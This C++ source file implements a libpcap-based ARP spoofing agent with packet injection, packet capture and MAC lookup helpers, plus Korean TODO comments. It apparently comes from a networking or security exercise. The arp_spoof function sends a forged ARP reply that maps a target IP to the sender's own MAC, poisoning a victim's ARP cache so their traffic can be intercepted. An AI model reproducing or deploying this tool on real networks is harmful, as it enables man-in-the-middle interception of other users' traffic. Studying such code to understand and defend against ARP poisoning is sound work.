#include "agent.h"

Agent::Agent(char *_dev){
    strncpy(dev, _dev, 0x100);
    get_dev_info(dev, mac, IP);
}

pktbyte* Agent::get_IP(){
    return IP;
}

pktbyte* Agent::get_mac(){
    return mac;
}

void Agent::show_info(){
    print_mac(mac, "Agent ");
    print_IP(IP, "Agent ");
}

int Agent::send(char *dev, Xpkt *pkt){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    int res;

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        return -1;
    }

    if(!pcap_inject(handle, pkt->get_pktbuf(), pkt->get_len())){
        pcap_perror(handle, "send: ");
        return -1;
    }

    pcap_close(handle);
    return 0;
}

/* TODO
int Agent::dump(char *dev, Xpkt *pkt, bool (*callback)(pktbyte *pkt)){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        return -1;
    }

    while(true){
        struct pcap_pkthdr *header;

        pktbyte *pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        if(filter && filter(pkt)) 
            break;
    }

    return 0;
}
*/

// [TODO]
// 타임아웃 주고 필터링된 패킷들의 벡터를 돌려주면, 훨씬 안정적일듯함.
void Agent::snatch(char *dev, Xpkt *xpkt, bool (*filter)(pktbyte *pkt)){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        exit(-1);
    }

    while(true){
        struct pcap_pkthdr *header;
        const pktbyte *packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        if(filter && filter(const_cast<pktbyte *>(packet))){
            xpkt->set_pktbuf(const_cast<pktbyte *>(packet), header->len);
            break;
        }
    }

    pcap_close(handle);
}

int Agent::arp_send_req(char *dev, pktbyte *target){
    pktbyte * src_mac = Agent::get_mac();
    pktbyte * src_IP = Agent::get_IP();

    pktbyte eth_dst[ETH_ALEN];
    memset(eth_dst, 0xff, ETH_ALEN);        // Ethernet dst broadcast MAC

    pktbyte arp_tha[ETH_ALEN];
    memset(arp_tha, 0, ETH_ALEN);           // ARP request target hardware addr

    Ether ethhdr = Ether(eth_dst, src_mac, ETH_P_ARP);
    ARP arp = ARP(ARPOP_REQUEST, src_mac, src_IP, arp_tha, target);

    Xpkt pkt = ethhdr / arp;

    if(Agent::send(dev, &pkt)){
        std::cerr << "Error occured while sending packet" << std::endl;
        std::cerr << "[packet]" << std::endl;
        pkt.hexdump(ALL);
    }
}

int Agent::arp_send_raw(
    char *dev, 
    pktword op, 
    pktbyte *sha, 
    pktbyte *sip, 
    pktbyte *tha, 
    pktbyte *tip
){
    Ether ethhdr = Ether(tha, sha, ETH_P_ARP);
    ARP arp = ARP(op, sha, sip, tha, tip);

    Xpkt pkt = ethhdr / arp;

    if(Agent::send(dev, &pkt)){
        std::cerr << "Error occured while sending packet" << std::endl;
        std::cerr << "[packet]" << std::endl;
        pkt.hexdump(ALL);
    }
}

// [TODO]
// Snatch된 패킷이 정확히 상대에 관한 ARP reply일지 장담할 수가 없음
// => snatch에 타임아웃을 부여하고, 돌아온 arp vector에 대해 탐색하면서
// 잡아내면 훨씬 안정적일 듯함.
int Agent::arp_get_target_mac(char *dev, pktbyte *target, pktbyte *mac){
    Xpkt xpkt = Xpkt();
    std::thread snatcher(&Agent::snatch, this, dev, &xpkt, filter_ARP_reply);

    usleep(300); // Wait little time for snatcher to be ready
    Agent::arp_send_req(dev, target);
    snatcher.join();

    ARP arp = ARP(xpkt);
    memcpy(mac, arp.get_sha(), ETH_ALEN);

    return true;
}

int Agent::arp_spoof(char *dev, pktbyte *sender, pktbyte *target){
    pktbyte sender_mac[ETH_ALEN] = {0,};
    //char sender_mac_str[ETH_ALEN*3] = {0,};
    //char target_IP_str[20] = {0,};
    //char this_mac_str[ETH_ALEN*3] = {0,};

    //parse_mac(get_mac(), this_mac_str);
    //inet_ntop(AF_INET, target, target_IP_str, sizeof(target_IP_str));

    Agent::arp_get_target_mac(dev, sender, sender_mac);
    //parse_mac(sender_mac, sender_mac_str);
    //std::cout << "Sender MAC: " << sender_mac_str << std::endl << std::endl;

    //std::cout << "Spoof " << sender_mac_str << std::endl;
    //std::cout << "that mac address of " << target_IP_str << std::endl;
    //std::cout << "is "     << this_mac_str << std::endl;
    //std::cout << std::endl;

    Agent::arp_send_raw(
        dev,                    // dev
        ARPOP_REPLY,            // op
        Agent::get_mac(),       // sha
        target,                 // sip
        sender_mac,             // tha
        sender                  // tip
    );

    return true;
}